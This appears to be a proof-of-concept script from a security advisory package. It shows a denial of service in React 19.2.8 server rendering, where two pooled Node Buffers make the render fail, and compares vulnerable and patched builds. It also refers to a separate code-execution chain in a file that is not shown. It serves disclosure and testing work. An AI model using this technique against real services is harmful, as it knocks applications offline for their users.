/**
 * The low-effort corollary of the same root cause: denial of service.
 *
 * `run.mjs` needs the shared ArrayBuffer to be detachable, so that writing the
 * first view silently empties the second and desynchronises the wire. Node's
 * Buffer pool slab is *not* detachable, and React 19.2.8 hands the raw view to
 * the destination regardless - so the write throws, the render aborts, and the
 * response is lost. No attacker-controlled value is needed at all: a response
 * that transports two ordinary Buffers is enough.
 *
 * Every allocation below `Buffer.poolSize >>> 1` comes out of one shared slab,
 * which on current Node is every Buffer up to 32 KiB.
 *
 * Usage: node poc/dos.mjs
 */
import {spawn} from 'node:child_process';
import {mkdir, writeFile} from 'node:fs/promises';
import {fileURLToPath} from 'node:url';
import {dirname, join, resolve} from 'node:path';

const root = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const artifacts = join(root, 'artifacts');
await mkdir(artifacts, {recursive: true});

const noteFile = join(artifacts, '.dos-note.txt');
await writeFile(noteFile, 'an ordinary note');

console.log('='.repeat(78));
console.log('GHSA-xqc2-xf4c-x3h3 - denial of service via two pooled Buffers');
console.log('='.repeat(78));
console.log(`  Buffer.poolSize    ${Buffer.poolSize} (pooled while <= ${Buffer.poolSize >>> 1} bytes)`);
console.log('  model              { attachmentA: <3000 bytes>, attachmentB: <3000 bytes> }');
console.log('  both from Buffer.allocUnsafe(), transported as Uint8Array views\n');

for (const env of ['vulnerable', 'patched']) {
  const report = await render(join(root, 'env', env));
  const verdict = report.renderError
    ? `RENDER FAILED - ${report.wireBytes} bytes delivered`
    : `rendered ${report.wireBytes} bytes`;
  console.log(`  ${report.version.padEnd(8)} shared=${report.sharedArrayBuffer}  ${verdict}`);
  if (report.renderError) console.log(`           ${report.renderError}`);
}

console.log(
  '\n  On 19.2.8 any request that produces such a response returns nothing, so a\n' +
    '  single reachable route is an unauthenticated availability bug on its own -\n' +
    '  separate from the code-execution chain in run.mjs, and far easier to hit.\n',
);

function render(env) {
  return new Promise((resolvePromise, reject) => {
    const child = spawn(
      process.execPath,
      [
        '--conditions=react-server',
        join(root, 'poc/render.mjs'),
        '--env', env,
        '--out', join(artifacts, `dos-${env.endsWith('patched') ? 'patched' : 'vulnerable'}.rsc`),
        '--mode', 'pool',
        '--size', '3000',
        '--note-file', noteFile,
      ],
      {stdio: ['ignore', 'pipe', 'ignore']},
    );
    let out = '';
    child.stdout.on('data', d => (out += d));
    child.on('error', reject);
    child.on('close', () => {
      try {
        resolvePromise(JSON.parse(out.slice(out.indexOf('{'))));
      } catch (e) {
        reject(new Error(`no JSON report from the renderer:\n${out}`));
      }
    });
  });
}
